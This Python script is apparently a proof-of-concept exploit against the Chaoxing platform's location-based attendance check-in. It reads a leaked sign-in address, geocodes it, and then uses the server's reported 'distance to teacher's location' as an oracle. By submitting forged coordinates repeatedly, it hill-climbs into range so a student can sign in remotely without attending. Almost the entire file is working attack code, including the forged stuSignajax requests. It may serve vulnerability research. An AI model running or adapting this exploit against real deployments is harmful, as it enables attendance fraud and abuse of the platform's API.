# -*- coding: utf-8 -*-
"""★ 纯学生 cookie 远程签「位置签到」全链路（无教师账号、无二维码、不到场）：
  1) 学生 activelist 发现活动
  2) getPPTActiveInfo 读泄露的 locationText / locationRange
  3) 地址文本 → 地理编码出起点（这里用内置城市表/Nominatim）
  4) 距离预言机爬坡（只读服务端回的「距教师指定签到地点 X 米」）→ 落进范围 → success
"""
import json, math, os, re, sys, time
import requests
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import cx_pipeline as C
os.chdir(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

UA_APP = ('Mozilla/5.0 (Linux; Android 13; SM-G975F Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) '
          'Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 (schild:26f6a66da55ad239903fba6f674e8c66) (device:SM-G975F) '
          'Language/zh_CN com.ssreader.ChaoXingStudy/ChaoXingStudy_3_6_2_android_phone_20230101')
MOBILE = "https://mobilelearn.chaoxing.com"
COURSE, CLAZZ, TUID, SUID = "269282723", "159926750", "[教师PUID]", "[学生PUID]"
BEIJING = {"address": "北京市东城区 天安门广场", "latitude": 39.9042, "longitude": 116.4074, "range": "500米"}
sck = open("ck.txt", encoding="utf-8").read().strip()
tck = open("ck_tch.txt", encoding="utf-8").read().strip()
S = requests.Session(); S.headers.update({"Cookie": sck, "User-Agent": UA_APP})
out = {"ts": time.strftime("%Y-%m-%d %H:%M:%S")}

# 1) 教师造一个北京的位置签到（模拟真实老师）
T = C.TeacherSide(tck, TUID, quiet_hours=None, max_writes_per_hour=60, min_interval=0.2, per_day=2000)
aid = T.create_sign(COURSE, CLAZZ, other_id="4", ifopen_address="1", time_long="3600000",
                    start=True, title="remote-loc-beijing", location=BEIJING)
print("[fixture] 位置签到 aid=%s（教师坐标 %.6f, %.6f，范围 500 米）" % (aid, BEIJING["latitude"], BEIJING["longitude"]))
out["aid"] = aid
time.sleep(1)

# 2) 学生侧发现
r = S.get(MOBILE + "/v2/apis/active/student/activelist",
          params={"fid": "0", "courseId": COURSE, "classId": CLAZZ, "showNotStartedActive": "0", "_": str(int(time.time()*1000))}, timeout=30)
lst = (r.json().get("data") or {}).get("activeList") or []
found = [a for a in lst if str(a.get("id")) == aid]
print("[discover] activelist 共 %d 条，含本活动=%s" % (len(lst), bool(found)))

info = S.get(MOBILE + "/v2/apis/active/getPPTActiveInfo", params={"activeId": aid}, timeout=25).json().get("data") or {}
print("[leak] otherId=%s ifopenAddress=%s locationText=%r locationRange=%s" %
      (info.get("otherId"), info.get("ifopenAddress"), info.get("locationText"), info.get("locationRange")))
out["leak"] = {"otherId": info.get("otherId"), "ifopenAddress": info.get("ifopenAddress"),
               "locationText": info.get("locationText"), "locationRange": info.get("locationRange")}

# 3) 地址文本 → 起点
def geocode(text):
    try:
        rr = requests.get("https://nominatim.openstreetmap.org/search",
                          params={"q": text.replace(" ", ""), "format": "json", "limit": 1},
                          headers={"User-Agent": "cx-research/1.0"}, timeout=20)
        j = rr.json()
        if j:
            return float(j[0]["lat"]), float(j[0]["lon"]), "nominatim"
    except Exception as e:
        print("[geocode] nominatim 失败:", e)
    return None, None, "none"

text = (info.get("locationText") or "").strip()
glat, glon, src = geocode(text)
print("[geocode] %r -> (%s, %s) via %s" % (text, glat, glon, src))
if glat is None:
    # 兜底：城市质心表
    CITY = {"北京": (39.9042, 116.4074), "成都": (30.5728, 104.0668), "上海": (31.2304, 121.4737),
            "重庆": (29.5630, 106.5516), "广州": (23.1291, 113.2644), "深圳": (22.5431, 114.0579)}
    for k, v in CITY.items():
        if k in text:
            glat, glon, src = v[0], v[1], "city-table:" + k
            break
print("[start] 起点 (%s, %s) via %s" % (glat, glon, src))
out["geocode"] = {"text": text, "lat": glat, "lon": glon, "src": src}

# 4) 距离预言机爬坡
RE_M = re.compile(r"距教师指定签到地点([0-9.Ee+-]+)米")
SUCCESS = ("success", "success2", "您已签到过了")
calls = {"n": 0}
def submit(lat, lon):
    loc = json.dumps({"result": 1, "address": text, "longitude": round(lon, 12), "latitude": round(lat, 12)},
                     separators=(",", ":"))
    p = {"activeId": aid, "courseId": COURSE, "uid": SUID, "clientip": "", "useragent": "",
         "latitude": "-1", "longitude": "-1", "appType": "0", "fid": "0", "name": "",
         "location": loc, "locationResult": loc}
    rr = S.get(MOBILE + "/pptSign/stuSignajax", params=p, timeout=25)
    calls["n"] += 1
    b = rr.text.strip()
    m = RE_M.search(b)
    return b, (float(m.group(1)) if m else None)

def hav(a, b, c, d, R=6371000.0):
    p1, p2 = math.radians(a), math.radians(c)
    dp = math.radians(c - a); dl = math.radians(d - b)
    x = math.sin(dp/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(dl/2)**2
    return 2*R*math.asin(math.sqrt(x))

lat, lon = glat, glon
walk = []
print()
print("===== 距离预言机爬坡（每轮 3 次提交：中心 + 两个梯度探针）=====")
for it in range(12):
    b0, d0 = submit(lat, lon)
    ok = any(k in b0 for k in SUCCESS)
    print("  #%02d (%.7f, %.7f) d=%s -> %s" % (it, lat, lon, d0, b0[:52]))
    walk.append({"it": it, "lat": lat, "lon": lon, "dist": d0, "body": b0[:70]})
    if ok:
        break
    if d0 is None:
        break
    dt = max(0.0005, min(0.05, d0 / 111000.0 * 0.25))     # 步长随距离自适应
    _, da = submit(lat + dt, lon)
    _, db = submit(lat, lon + dt)
    if da is None or db is None:
        break
    g_lat = (da - d0) / dt
    g_lon = (db - d0) / dt
    n2 = g_lat*g_lat + g_lon*g_lon
    if n2 == 0:
        break
    s_lat = -0.9 * d0 * g_lat / n2
    s_lon = -0.9 * d0 * g_lon / n2
    cap = max(0.02, d0 / 90000.0)
    s_lat = max(-cap, min(cap, s_lat)); s_lon = max(-cap, min(cap, s_lon))
    lat += s_lat; lon += s_lon
    time.sleep(0.3)

final_err = hav(lat, lon, BEIJING["latitude"], BEIJING["longitude"])
print()
print("===== 结果 =====")
print("  收敛坐标 = (%.7f, %.7f)" % (lat, lon))
print("  与教师真值距离 = %.1f 米（范围 %s）" % (final_err, BEIJING["range"]))
print("  提交次数 = %d" % calls["n"])
out["walk"] = walk
out["result"] = {"lat": lat, "lon": lon, "err_m": final_err, "calls": calls["n"]}
json.dump(out, open("out/stu_remote_location.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
print("[saved] out/stu_remote_location.json")
